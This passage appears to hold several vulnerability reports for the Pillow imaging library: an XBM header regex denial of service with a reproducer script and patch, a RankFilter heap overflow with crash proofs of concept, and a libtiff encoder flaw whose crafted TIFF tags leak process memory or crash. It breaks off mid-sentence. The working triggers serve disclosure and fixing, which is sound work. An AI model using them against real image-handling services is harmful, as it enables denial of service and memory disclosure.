8.5 s, k = 30 → 19.9 s (roughly ×27 per doubling of k, i.e. about k^4.7). A well-formed 512-byte XBM matches in 10 µs and opens and loads through `Image.open()` in ~40 ms including plugin import; the same k = 60 header with `_bits[]` present matches in 5 µs. The regex, `src/PIL/XbmImagePlugin.py:32`: ```python xbm_head = re.compile( rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` and the only call site, `src/PIL/XbmImagePlugin.py:58`: ```python def _open(self) -> None: … m = xbm_head.match(self.fp.read(512)) if not m: msg = "not a XBM file" raise SyntaxError(msg) ``` For a well-formed header (`#define im_width 8\n…static char im_bits[] = {`) each `[ \t]+` eats the single space, `.*`/`[^_]*` eat the identifier prefix, and `[\000-\377]*_bits\[]` finds the literal on its first backward scan, so the match is linear. The crafted header diverges at every one of those points: - `[ \t]+.*_width` and `[ \t]+.*_height`: the run of k spaces after `#define` can be split between `[ \t]+` and `.*` in k ways, all leading to the same continuation. Factor k each. (The choice of `\r` terminators is incidental: the same header with `\n` terminators is equally slow.) - `[ \t]+[^_]*_x_hot` and `[ \t]+[^_]*_y_hot` inside the optional `hotspot` group: `[^_]*` also matches spaces, so the same k-way split exists twice more. Factor k each. These two lines are essential: without them the same input is rejected in about 10 ms. - `[\r\n]+` closing the `hotspot` group, followed by `)?` and `[\000-\377]*`: the run of k `\r` bytes after `_y_hot 1` can be divided between `[\r\n]+` and `[\000-\377]*` in k ways. Factor k. - `[\000-\377]*_bits\[]`: for every combination above, the engine swallows the remaining ~150 bytes of padding and walks back looking for `_bits[]`. The input contains `_bits` but never `[]`, so this always fails and every combination is visited. CPython's `re` is a backtracking engine without memoisation, so the total work is on the order of k^5 × (512 − header length) steps — about 10^11 for k = 60, consistent with the measured 375 s. The 512-byte read caps k (5k + ~60 ≤ 512), so the cost per `open()` is bounded, but the bound is minutes of CPU. The path is the default one. `Image.open()` (`src/PIL/Image.py:3719`) reads a 16-byte prefix and offers it to every registered plugin's accept hook; `XbmImagePlugin._accept()` (`src/PIL/XbmImagePlugin.py:43`) returns true for anything whose left-stripped prefix starts with `#define`, and `_open()` then runs the regex. No size, pixel-count or decompression-bomb check can apply before this point because nothing has been parsed yet, and since the match ultimately fails the file is never identified, so the only outcome for the caller is `UnidentifiedImageError` after the delay. File name and extension are irrelevant because dispatch is by content. A `faulthandler` stack dump taken 20 s into the call shows the interpreter at `XbmImagePlugin.py:58 in _open` ← `ImageFile.py:154 in __init__` ← `Image.py:3699 in _open_core` ← `Image.py:3719 in open`. `ImageFile.Parser.feed()` (`src/PIL/ImageFile.py:584`) amplifies this further: until the stream is identified it calls `Image.open()` on all accumulated data at every `feed()`, so an application feeding the stream in chunks pays the regex cost once per chunk (measured: k = 15 header fed in 8 chunks → 4.6 s versus 0.76 s for a single `open()`). ## Impact Anyone who can get 512 bytes in front of `Image.open()` — an upload endpoint, thumbnailer, or any service that uses Pillow to sniff whether a blob is an image — pins one CPU core of the handling process for roughly six minutes per request with the default plugin set and default limits. Nothing large is allocated and no `DecompressionBombWarning`/`Error` fires; application-side upload size limits do not help because the file is tiny, and `Image.MAX_IMAGE_PIXELS` is never consulted because no image is ever identified. A handful of concurrent requests is enough to exhaust a typical worker pool. The per-call cost is bounded by the 512-byte header read, so this is a CPU-exhaustion denial of service of the handling process rather than an infinite loop. Applications that pass an explicit `formats=` allowlist to `Image.open()` that excludes `"XBM"` are not affected. This is the same bug class as CVE-2021-25292 (catastrophic backtracking in the `PdfParser` regexes, fixed in 8.1.1) and CVE-2021-23437 (`ImageColor.getrgb` ReDoS, fixed in 8.3.2), in a different plugin; unlike the PDF case it is reached from plain `Image.open()` on any byte stream. ## Reproducing `repro` is a single Python script. It uses the installed Pillow through the public `Image.open()` API and needs no rebuild. Each input is the 512-byte header from Details: four `#define` lines with k spaces after `#define`, lines ending in `\r`, k `\r` bytes after `_y_hot 1`, padding with `A` up to the 512 bytes that `_open()` reads. The only thing that changes between inputs is the tail: `_bits[]` (valid) or `_bits` (the final literal can never match). 1. **Control.** Opens the k = 60 header with the tail `_bits[]`. The regex matches on its first try and Pillow reports `XBM (1, 1)` in about 50 ms. This shows that the same bytes are only slow when the match has to fail. 2. **Attack.** Opens the header with the tail `_bits` at k = 10, 15, 20 and 25. Each one raises `UnidentifiedImageError`, after about 0.1 s, 0.75 s, 3.0 s and 8.6 s. The time grows polynomially, not linearly. The k = 60 input from Details, which takes about 6 minutes of CPU, is not run. Expected output on this commit: ``` control k=60 '_bits[]': XBM (1, 1) in 0.052s attack k=10 '_bits' : UnidentifiedImageError in 0.105s attack k=15 '_bits' : UnidentifiedImageError in 0.748s attack k=20 '_bits' : UnidentifiedImageError in 3.024s attack k=25 '_bits' : UnidentifiedImageError in 8.561s BUG ``` The script prints `BUG` only when all of these hold: - the control header opened as `XBM` in under 1 s; - the k = 25 attack input took more than 2 s; - the k = 25 attack input took more than 5 times as long as the k = 15 one, i.e. the cost grows super-linearly in k. Otherwise it prints `OK`. With the attached patch applied, every attack input is rejected at once, so the script prints `OK`. ## Suggested fix The attached patch removes the overlap between `[ \t]+` and the quantifier that matches the identifier prefix in `xbm_head` (`src/PIL/XbmImagePlugin.py:32-40`), so the whitespace after `#define` can be consumed in exactly one way and the identifier cannot run across line terminators. It matches the identifier with `[^ \t\r\n]*` (and `[^ \t\r\n_]*` in the hotspot group, which keeps the existing "no underscore before `_x_hot`/`_y_hot`" behaviour); the remaining quantifier pairs are then either over disjoint character classes or reduce to a single linear rescan of at most 512 bytes: ```diff xbm_head = re.compile( - rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" + rb"\s*#define[ \t]+[^ \t\r\n]*_width[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n]*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" - b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` This mirrors the `PdfParser` fix for CVE-2021-25292. The patch also adds a `test_redos` case to `Tests/test_file_xbm.py`, in the style of the one in `Tests/test_file_pdf.py`: it builds the k = 60 header from Details and, under `@timeout_unless_slower_valgrind(1)`, expects `XbmImageFile` to raise `SyntaxError`. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and the existing `Tests/test_file_xbm.py` (including `hopper.xbm`, `hopper_underscore.xbm` and the hotspot round-trip) still passes. The change does reject headers whose identifier contains whitespace (`#define foo bar_width 16`), which is not valid C and is not produced by Pillow's own XBM writer. ## The patch Use more specific regex chars in the XBM header regex to prevent ReDoS in Image.open() on a crafted 512-byte header Applies to `src/PIL/XbmImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_xbm.py b/Tests/test_file_xbm.py index 1988c417f..67236c795 100644 --- a/Tests/test_file_xbm.py +++ b/Tests/test_file_xbm.py @@ -6,7 +6,7 @@ import pytest from PIL import Image, XbmImagePlugin -from .helper import hopper +from .helper import hopper, timeout_unless_slower_valgrind TYPE_CHECKING = False if TYPE_CHECKING: @@ -91,3 +91,17 @@ def test_hotspot(tmp_path: Path) -> None: with Image.open(out) as reloaded: assert reloaded.info["hotspot"] == hotspot + + +@timeout_unless_slower_valgrind(1) +def test_redos() -> None: + k = 60 + malicious = b"#define" + b" " * k + b"_width 1\r" + malicious += b"#define" + b" " * k + b"_height 1\r" + malicious += b"#define" + b" " * k + b"_x_hot 1\r" + malicious += b"#define" + b" " * k + b"_y_hot 1" + b"\r" * k + b"_bits" + malicious += b"A" * (512 - len(malicious)) + + # The important thing is it doesn't timeout, cause a ReDoS + with pytest.raises(SyntaxError): + XbmImagePlugin.XbmImageFile(BytesIO(malicious)) diff --git a/src/PIL/XbmImagePlugin.py b/src/PIL/XbmImagePlugin.py index 95729d73d..7435d20f2 100644 --- a/src/PIL/XbmImagePlugin.py +++ b/src/PIL/XbmImagePlugin.py @@ -29,12 +29,14 @@ if TYPE_CHECKING: from typing import IO # XBM header +# The identifier before each suffix cannot contain whitespace, so that it +# cannot overlap with the preceding [ \t]+ and cause a ReDoS xbm_head = re.compile( - rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" + rb"\s*#define[ \t]+[^ \t\r\n]*_width[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n]*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" - b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` ## The reproducer
Reproducer — repro, 1,138 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # XbmImagePlugin.xbm_head catastrophic backtracking, reached from Image.open() # on a <=512-byte stream. Prints BUG if a failing 512-byte header takes # super-linearly long while the same-shaped valid header opens instantly. import io, time from PIL import Image def hdr(k, tail): d = b"" for name in (b"_width 1\r", b"_height 1\r", b"_x_hot 1\r", b"_y_hot 1"): d += b"#define" + b" " * k + name d += b"\r" * k + tail return d + b"A" * (512 - len(d)) def timed(data): s = time.perf_counter() try: im = Image.open(io.BytesIO(data)); r = f"{im.format} {im.size}" except Exception as e: r = type(e).__name__ return r, time.perf_counter() - s ctl, tc = timed(hdr(60, b"_bits[]")) print(f"control k=60 '_bits[]': {ctl} in {tc:.3f}s") ts = {} for k in (10, 15, 20, 25): r, ts[k] = timed(hdr(k, b"_bits")) print(f"attack k={k:2d} '_bits' : {r} in {ts[k]:.3f}s", flush=True) # k=60 (fits easily in 512 bytes) runs for minutes; not executed here. bug = ctl.startswith("XBM") and tc < 1 and ts[25] > 2 and ts[25] > 5 * ts[15] print("BUG" if bug else "OK") ```

units.body:
Pillow: Heap out-of-bounds write in `ImageFilter.RankFilter` via integer overflow in `ImagingExpand`
### Summary

Pillow's public rank-filter API can trigger a native heap out-of-bounds write
when given a very large odd filter size.

Minimal public API trigger:

```python
from PIL import Image, ImageFilter

im = Image.new("L", (3, 3), 128)
im.filter(ImageFilter.MedianFilter(4294967295))
```

`ImageFilter.RankFilter.filter()` calls `image.expand(size // 2, size // 2)`
before rank-filter size validation. With `size = 4294967295`, the
expansion margin is `2147483647` (`INT_MAX`). `ImagingExpand()` then computes
the output dimensions with unchecked signed `int` arithmetic. On tested builds,
this wraps to a tiny output image and the border-expansion loop writes past the
allocation.

This is reachable through documented public classes (`RankFilter`,
`MedianFilter`, `MinFilter`, and `MaxFilter`). No private API, ctypes, or custom
Python object is needed.

### Details

Current `src/PIL/ImageFilter.py`:

```python
class RankFilter(Filter):
    def filter(self, image):
        if image.mode == "P":
            msg = "cannot filter palette images"
            raise ValueError(msg)
        image = image.expand(self.size // 2, self.size // 2)
        return image.rankfilter(self.size, self.rank)
```

The `expand()` call is made before `image.rankfilter(...)`.

Current `src/libImaging/Filter.c:ImagingExpand()` does not check output-size
overflow:

```c
if (xmargin < 0 && ymargin < 0) {
    return (Imaging)ImagingError_ValueError("bad kernel size");
}

imOut = ImagingNewDirty(
    imIn->mode, imIn->xsize + 2 * xmargin, imIn->ysize + 2 * ymargin
);
```

For a `3x3` image and `xmargin = ymargin = INT_MAX`, the computed output size
wraps to `1x1` on tested builds. The following loop still uses the huge margin:

```c
for (x = 0; x < xmargin; x++) {
    imOut->image[yout][x] = imIn->image[yin][0];
}
```

`src/libImaging/RankFilter.c` does contain checks that would reject this size:

```c
if (!(size & 1)) {
    return (Imaging)ImagingError_ValueError("bad filter size");
}
if (size > INT_MAX / size || size > INT_MAX / (size * (int)sizeof(FLOAT32))) {
    return (Imaging)ImagingError_ValueError("filter size too large");
}
```

But  those checks are reached only after `RankFilter.filter()` has already
called `image.expand(...)`.

Mode `"L"` produces 1-byte OOB stores. Modes `"I"` and `"F"` produce 4-byte OOB
stores. The repeated value written OOB is copied from the source image border
pixel, so attacker-supplied image bytes can influence it. This is a sequential
overwrite, not an arbitrary-address write.

### PoC

Minimal ASAN crash PoC:

```python
from PIL import Image, ImageFilter

im = Image.new("L", (3, 3), 128)
im.filter(ImageFilter.MedianFilter(4294967295))
```

Observed on local Pillow `12.3.0.dev0` ASAN target:

```text
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 1
ImagingExpand /out/src/src/libImaging/Filter.c:99
_expand_image /out/src/src/_imaging.c:1100
0 bytes after a 1-byte allocation
```

4-byte write variant with source pixel loaded from normal image bytes:

```python
from io import BytesIO
from PIL import Image, ImageFilter

SIZE = 4294967295
PIXEL = 0x41424344

src = BytesIO()
Image.new("I", (3, 3), PIXEL).save(src, format="TIFF")

im = Image.open(BytesIO(src.getvalue()))
im.load()
assert im.mode == "I"
assert im.getpixel((0, 0)) == PIXEL

im.filter(ImageFilter.MedianFilter(SIZE))
```

Observed ASAN signature:

```text
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 4
ImagingExpand /out/src/src/libImaging/Filter.c:101
_expand_image /out/src/src/_imaging.c:1100
0 bytes after a 4-byte allocation
```

Version checks:

```text
Pillow 1.0: ASAN heap-buffer-overflow WRITE confirmed at runtime
Pillow 12.3.0.dev0: ASAN heap-buffer-overflow WRITE confirmed at runtime
Pillow 1.0 through 12.2.0: source sweep confirmed the vulnerable public
                           validation order and unchecked ImagingExpand arithmetic
upstream/main at 9c1097c861420c77af53c7c9af2a1382e2bfaa8b: still affected
```

### Impact

It is a heap out-of-bounds write in Pillow's native C extension, reachable
through public image-filter classes.

Applications are impacted if an untrusted user can control the rank-filter
size/configuration passed to Pillow. If the image is also attacker-supplied, the
source pixel value written out of bounds can be attacker-influenced, including
4-byte values for mode `"I"` images.


## Possible fix

Validate the rank-filter size before calling `image.expand(...)`, and harden
`ImagingExpand()` against invalid margins and overflow:

```c
if (xmargin < 0 || ymargin < 0) {
    return (Imaging)ImagingError_ValueError("bad kernel size");
}
if (xmargin > (INT_MAX - imIn->xsize) / 2 ||
    ymargin > (INT_MAX - imIn->ysize) / 2) {
    return (Imaging)ImagingError_ValueError("bad kernel size");
}
```

Pillow: Memory disclosure and segfault in libtiff encoder via crafted TIFF tags
```
============================================================================
Memory disclosure and segfault in libtiff encoder via crafted TIFF tags
Location: src/encode.c:1014  in PyImaging_LibTiffEncoderNew()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================
```

A crafted TIFF file of a few hundred bytes makes Pillow copy an attacker-chosen amount of its own process memory into the TIFF it writes back out, or crash the process outright. The trigger is an ordinary `Image.open()` followed by a bare `im.save(fp, "TIFF")`. The only precondition is that the application re-saves images as TIFF. When the uploaded file is compressed, Pillow routes that save through libtiff automatically, with no options from the application. The attached reproducer does this with a 356-byte LZW TIFF: one crafted tag comes back holding 65536 bytes taken from `_imaging.so`'s read-only data, and a second crafted tag makes the worker die with SIGSEGV on every run.

The bug is in `PyImaging_LibTiffEncoderNew` (`src/encode.c`). It decides what arguments to pass to the variadic `TIFFSetField()` from the shape of the Python value (scalar, tuple or bytes). It assumes its `ImagingLibTiffMergeFieldInfo()` call defined how libtiff will read them. But `TIFFMergeFieldInfo()` never overrides libtiff's built-in field table, so libtiff reads the arguments according to its own definition of the tag:

- For a counted array tag such as DNGPrivateData (50740), a count-1 integer in the source file is taken as the byte count. The data pointer is then read from an argument slot Pillow never wrote, and that many bytes are copied into the output.
- For a fixed-size array tag such as ActiveArea (50829), the integer itself is used as the source address.

Where that unwritten slot points depends on the compiler. In the tested clang build it points into `_imaging.so`, and a larger count returned thousands of pointers into libpython, libc and libtiff, which defeats address-space randomisation for anyone chaining another bug. When the application preserves metadata with `tiffinfo=im.tag_v2`, a 64-bit entry turns ActiveArea into a 16-byte read from an address the attacker chooses. All observed memory errors are reads; no out-of-bounds write was found.

Other branches of the same loop share the defect and are reachable from crafted TIFFs or from EXIF in JPEG/PNG/WebP re-saved as compressed TIFF. These are the `bytes`, RATIONAL-tuple and typed-tuple branches, and a BYTE-typed ColorMap. The file-reachable forwarding was introduced in `a3d45e9cefd0` ("Added custom int and float TIFF tags") and first released in 5.4.0.

## Details

`PyImaging_LibTiffEncoderNew` (`src/encode.c:777-1060`) chooses the argument
list it hands to the variadic `TIFFSetField()` from the *Python* value of each
tag — scalar vs. tuple vs. `bytes`, and a type that is either autodetected or
copied from the source file's IFD — and assumes that its own
`ImagingLibTiffMergeFieldInfo()` registration defines how libtiff will read the
`va_list`. It does not: libtiff keeps its built-in definition for every tag it
already knows, and core tags are never registered at all. libtiff therefore
consumes the varargs as `(count, pointer)`, `(pointer)` or three pointers
according to *its* field table, whatever Pillow actually pushed. The encoder
never consults that table (`TIFFFindField` / `TIFFFieldPassCount` /
`TIFFFieldWriteCount` / `TIFFFieldDataType`) before the call.

The most severe instance, and the one the attached reproducer exercises: when a
TIFF is re-saved through the libtiff writer, every tag of the source IFD that
Pillow does not recognise is forwarded to libtiff with `TIFFSetField()`. A
count-1 integer entry is passed as a single scalar vararg. If libtiff's own
field table defines that tag number as an *array* field, libtiff consumes the
varargs as `(count, pointer)` or `(pointer)` instead, so the attacker's integer
becomes either the number of bytes to copy from a never-written vararg slot, or
the source address itself. The same mismatch is reachable through the typed
tuple branches (tuple length consumed as a pointer for fixed-count built-in
tags such as `CFARepeatPatternDim`, even when the source file is well-formed),
the `bytes`, `TIFF_RATIONAL`-tuple and core-tag branches of the same loop;
those are listed
under *Other branches with the same defect* below and need to be covered by the
same fix.

A 181-byte TIFF (16×16 RGB, one LZW strip, plus one extra IFD entry
`50740 / LONG / count 1 / value 4096` — DNGPrivateData) opened with
`Image.open()` and saved with a bare `im.save(buf, "TIFF")` produces a 4296-byte
output whose tag 50740 holds 4096 bytes that occur nowhere in the input; scanning
`/proc/self/mem` finds them in the read-only data segment of `_imaging.so`.
Changing the extra entry to `50829 / LONG / 1 / 64` (ActiveArea) makes the same
two calls segfault in `memcpy(dst, src=0x40, n=16)` under
`ImagingLibTiffSetField` ← `PyImaging_LibTiffEncoderNew`. An ASan build of the
extensions reports `READ of size 4096` in `memcpy` called from
`src/encode.c:1014` for the first input.

### Code path

`_save` copies all tags of the opened image into the libtiff attribute list.
For a tag that is neither in `LIBTIFF_CORE` nor in `TiffTags.TAGS_V2`, no type
is recorded, so the value goes through untyped:

```python
# src/PIL/TiffImagePlugin.py:1782
supplied_tags = {**legacy_ifd, **getattr(im, "tag_v2", {})}
…
# :1959-1982
for tag, value in itertools.chain(ifd.items(), supplied_tags.items()):
    if tag not in TiffTags.LIBTIFF_CORE:
        …
        elif isinstance(value, (int, float, str, bytes)) or …:
            type = TiffTags.lookup(tag).type      # None for 50740, 50829, …
            if type:
                types[tag] = type
    if tag not in atts and tag not in blocklist:
        …
            atts[tag] = value                     # plain int 4096
```

`compression` defaults to the source image's `im.info["compression"]`
(`TiffImagePlugin.py:1731-1746`), so a compressed source selects the libtiff
writer without the application asking for it.

In the encoder the untyped `int` is autodetected as `TIFF_LONG`
(`src/encode.c:805-815`), the tag is "registered" as a scalar custom field, and
then set with one 32-bit vararg:

```c
// src/encode.c:844      (is_var_length = 0 → writecount 1, passcount 0)
if (ImagingLibTiffMergeFieldInfo(&encoder->state, type, key_int, is_var_length)) {
    … continue;
}
…
// src/encode.c:1013-1016
} else if (type == TIFF_LONG || type == TIFF_IFD) {
    status = ImagingLibTiffSetField(
        &encoder->state, (ttag_t)key_int, (UINT32)PyLong_AsLong(value)
    );
```

The registration does not do what the caller assumes. `TIFFMergeFieldInfo()`
only adds definitions for tags libtiff does not already know and returns 0
(success) either way, so for tags in libtiff's built-in table the built-in
definition stays in force. Queried against the linked libtiff 4.5.0 after
exactly Pillow's merge call:

```
50740 DNGPrivateData      type=BYTE   passcount=1 writecount=-1   (unchanged)
50829 ActiveArea          type=LONG   passcount=0 writecount=4    (unchanged)
65000 CustomField         type=LONG   passcount=0 writecount=1    (Pillow's definition, tag was unknown)
```

libtiff's setter for `FIELD_CUSTOM` tags then interprets the `va_list`
according to *its* definition: for `passcount=1` it reads `va_arg(ap, int)` as
the element count — the attacker's 4096 — allocates `count * size` bytes and
`memcpy`s that many bytes from `va_arg(ap, void *)`, a slot
`PyImaging_LibTiffEncoderNew` never wrote. On x86-64 that slot is register
`rcx`; in this build it holds a pointer into `_imaging.so`'s `.rodata`, so the
copy succeeds deterministically (a value of 2 000 000 also succeeds and yields a
2 000 200-byte output). `TIFFWriteDirectory` writes the copied bytes into the
output file as the tag's value. For fixed-count array fields (`passcount=0`,
`writecount=4` for ActiveArea) there is no count argument, so the attacker's
scalar is consumed as the `void *` source and 16 bytes are read from address
64 → SIGSEGV.

Tags in libtiff 4.5's built-in table that Pillow forwards untyped and that take
the `(count, pointer)` form include DNGPrivateData 50740, CFAPattern 33422,
CFAPlaneColor 50710, LinearizationTable 50712, BlackLevel 50714, WhiteLevel
50717, ColorMatrix1/2 50721/50722, AsShotNeutral 50728, OriginalRawFileName/Data
50827/50828, AsShotICCProfile 50831, CurrentICCProfile 50833. Fixed-count ones
(pointer only → crash) include ActiveArea 50829, DNGVersion/DNGBackwardVersion
50706/50707, DefaultScale/DefaultCropOrigin/DefaultCropSize 50718–50720,
AsShotWhiteXY 50729, CFARepeatPatternDim 33421, BlackLevelRepeatDim 50713,
ImageLayer 34732, RawDataUniqueID 50781.

When the application saves with `tiffinfo=im.tag_v2` (the documented way to
preserve metadata), the file-declared type is honoured, and a `LONG8` entry
reaches the `(uint64_t)PyLong_AsLongLong(value)` branch at
`src/encode.c:1049-1052`. For ActiveArea that is a 16-byte read from a full
64-bit attacker-chosen address into the output: a source entry
`50829 / LONG8 / 1 / <address of a Python bytes object>` produced an output
ActiveArea of `(b'SECR', b'ET-T', b'OKEN', b'-012')` in testing.

The comment above `blocklist +=` at `TiffImagePlugin.py:1938-1944` already notes
that array tags with the wrong length "will result in segfaults"; the blocklist
covers only a handful of tags Pillow itself knows, not the ones libtiff knows and
Pillow does not. Forwarding of these tags was introduced in `a3d45e9cefd0`
("Added custom int and float TIFF tags", 2018-10-25), first released in 5.4.0;
releases 2.0.0–3.0.0 forwarded them as scalars too, until `9fa6634f4`
("Partial fix for #1597") limited `_save` to `LIBTIFF_CORE`.

### Other branches with the same defect

The scalar-integer branch above is one of several places in the same loop
where the call shape is derived from the Python value rather than from
libtiff's definition. All of the following were confirmed on this commit (stock
build crashes and/or ASan reports, stack always `memcpy ← libtiff ←
ImagingLibTiffSetField src/libImaging/TiffDecode.c:934 ←
PyImaging_LibTiffEncoderNew`), and all are reachable from a sub-1 KB crafted
file followed by an ordinary `save()`:

* **Typed tuple → `(len, av)` for a fixed-count built-in field**
  (`src/encode.c:904-994`, the SHORT/LONG/SBYTE/SSHORT/SLONG/FLOAT/DOUBLE
  tuple branches all call `ImagingLibTiffSetField(..., len, av)`). For libtiff
  built-in fields with `passcount=0` and a fixed `writecount` —
  `CFARepeatPatternDim` 33421 (SHORT×2), `BlackLevelRepeatDim` 50713
  (SHORT×2), `ImageLayer` 34732 (LONG×2), `ActiveArea` 50829 (LONG×4),
  `MatrixWorldToScreen/Camera` 33305/33306 (FLOAT×16) — libtiff takes the
  *first* vararg as the source pointer, so the tuple length becomes the
  `memcpy` source address. A perfectly well-formed 206-byte 8×8 PackBits TIFF
  carrying `33421 / SHORT / 2 / (2, 2)` re-saved with a bare
  `im.save(out, "TIFF")` dies with SIGSEGV in `memcpy` (gdb: `rsi = 0x2`, the
  tuple length) on every run; so does
  `Image.new("L", (8, 8)).save(buf, "TIFF", compression="packbits",
  tiffinfo={33421: (2, 2)})`, and a JPEG whose EXIF carries the tag saved with
  `exif=im.getexif()` into a compressed TIFF. `bytes` values for built-in
  fixed-count BYTE tags (e.g. `DNGVersion` 50706, BYTE×4) crash the same way
  through the `(PyBytes_Size, PyBytes_AsString)` call at `src/encode.c:860-865`.
  The mirror image for `passcount=1` fields: `Photoshop` 34377 declared
  SHORT, count 1, value 60000 takes the scalar branch at `:1009-1012`, libtiff
  reads 60000 as the count and an unpassed vararg as the pointer, and the
  re-save *succeeds* with a 60162-byte output whose tag 34377 holds 60000 bytes
  of process memory (here C prototype strings from `_imaging.so`'s `.rodata`).
* **`bytes` value → single `char *`** (`src/encode.c:805-815` autodetects
  `bytes` as `TIFF_ASCII`; `:1033-1042` passes `PyBytes_AsString(value)` alone).
  `ImageFileDirectory_v2._setitem` stores a BYTE-typed entry as bare `bytes`
  and an ASCII-typed one as `str` (encoded to `bytes` by `_save`), so the
  file's declared type selects this branch.
  - `ColorMap` (320) declared BYTE with 4 bytes of data in a non-palette
    PackBits TIFF: 320 is in `core_tags[]`, no type is consulted, the value
    skips the 768-tuple `TIFFTAG_COLORMAP` branch (`:871-895`) and libtiff reads
    three `uint16_t *` and copies `1 << BitsPerSample` shorts from each — a
    512-byte over-read of the 5-byte Python bytes buffer, then dereference of
    two stale argument registers → SIGSEGV on every run of
    `Image.open(f); im.save(out, "TIFF")`. `COLORMAP` is not in `_save`'s
    `blocklist`.
  - `Photoshop` (34377) declared ASCII: `_save` copies value *and* type
    (`TiffImagePlugin.py:1802-1818`; only `IPTC_NAA_CHUNK` has a BYTE/UNDEFINED
    type guard there, from commit 2245df0a — `PHOTOSHOP_CHUNK` and `XMP` do
    not). libtiff's definition is BYTE, `passcount=1`, so the low 32 bits of
    the `char *` become the byte count for a `memcpy` from a stale register
    (ASan: `READ of size 3518384`; stock: SIGSEGV in about half of runs,
    otherwise `RuntimeError`). `ICCProfile` (34675) declared ASCII behaves the
    same way via `im.info["icc_profile"]` → `ifd[ICCPROFILE]`
    (`TiffImagePlugin.py:1822-1824`).
* **`TIFF_RATIONAL` tuple → array with no count** (`src/encode.c:995-1006`;
  compare the `TIFF_FLOAT` branch at `:969-981`, which passes `len, av`).
  - For a private tag (e.g. 50000) Pillow itself registers the field with
    `passcount=1` (`TiffDecode.c:904-908`), so libtiff takes the low 32 bits of
    `av` as the element count and the next stale vararg as the source:
    `heap-buffer-overflow READ of size 119872 … right of 8-byte region` under
    ASan (`119872 == 4 * low32(av)`), SIGSEGV in ~4 of 5 stock runs. Reached by
    a JPEG whose EXIF carries one private RATIONAL×2 tag saved with
    `im.save(out, "TIFF", compression="tiff_lzw", exif=im.info["exif"])`, or a
    TIFF re-saved with `tiffinfo=im.tag_v2` (`_setitem` auto-types a tuple of
    `IFDRational` as RATIONAL, `TiffImagePlugin.py:689-701`; `types[tag] =
    ifd.tagtype[tag]` at `:1968`).
  - For libtiff's built-in fixed-count float tags `WhitePoint` (318, 2),
    `PrimaryChromaticities` (319, 6) and `YCbCrCoefficients` (529, 3), which
    `_save` forwards from any source TIFF and types RATIONAL via
    `TiffTags.lookup`, the pointer-only convention happens to match, but
    libtiff copies its *fixed* count from an array that is only as long as the
    file declared: a PackBits TIFF with `PrimaryChromaticities` count 1 and a
    bare `im.save(out, "TIFF")` gives `READ of size 24 … right of 4-byte
    region`, and the over-read floats are written to tag 319 of the output.
    `REFERENCEBLACKWHITE`/`TRANSFERFUNCTION` are blocklisted at
    `TiffImagePlugin.py:1941-1952` for exactly this reason; 318/319/529 are not.
* **Core tag reached as a scalar via a stale file-supplied type.** With the
  re-save idiom `im.save(out, "TIFF", tiffinfo=im.tag_v2)`, `_save` copies
  `ifd.tagtype[key] = info.tagtype[key]` for every key
  (`TiffImagePlugin.py:1768-1776`) and later assigns its own values to some of
  the same tags without resetting the type (`ifd[COLORMAP] = colormap` at
  `:1870-1877`; likewise BitsPerSample, SamplesPerPixel, ExtraSamples,
  ICCProfile, …). For a 418-byte PackBits *palette* TIFF whose ColorMap entry
  is declared BYTE, `_setitem` (`:751-770`) truncates `_save`'s 768-entry
  palette to a single `int` (with only a "too many entries" warning), the
  encoder receives `(320, 0)`, autodetects `TIFF_LONG`, and
  `src/encode.c:1013-1016` calls `TIFFSetField(TIFFTAG_COLORMAP, (UINT32)0)` —
  libtiff reads three `uint16_t *` and faults at an address ≤ 65280 on every
  run. The stale-tagtype copy is a Python-side hygiene bug in its own right,
  but its memory-safety consequence exists only because the encoder lets a
  non-tuple value reach `TIFFSetField(COLORMAP)`.

## Impact

Any service that accepts a TIFF and writes it back out as TIFF through libtiff —
which happens with a plain `im.save(fp, "TIFF")` whenever the uploaded file is
compressed, or whenever a `compression=` other than raw is requested — returns
to the uploader, inside one metadata tag of the produced file, an
attacker-chosen number of bytes read from a stale pointer in the worker process,
deterministically and without retries. Which memory that is depends on the
compiler's register allocation for `PyImaging_LibTiffEncoderNew`: in this clang
build the pointer is `_imaging.so + 0x1588`, so a request for 262 144 bytes
(which succeeded every time in testing, as did 2 000 000) covers the
extension's `.rodata`, `.data.rel.ro`/GOT and `.data` and returned 2 800+
resolved pointers into libpython, libc, libtiff, libjpeg and others — a complete
